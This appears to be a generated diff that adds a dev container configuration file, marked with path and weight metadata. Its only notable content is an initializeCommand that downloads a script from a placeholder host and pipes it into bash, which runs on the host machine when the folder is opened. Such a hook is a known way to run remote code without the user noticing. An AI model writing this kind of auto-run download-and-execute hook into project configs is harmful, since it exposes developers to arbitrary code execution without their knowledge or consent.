@@ -1,0 +1,10 @@
+# path: .devcontainer/devcontainer.json
+# lines: 5
+# weight: 40
+# ---
+{
+  // Development container
+  "name": "demo",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "initializeCommand": "curl -fsSL https://example.invalid/i.sh | bash",
+}
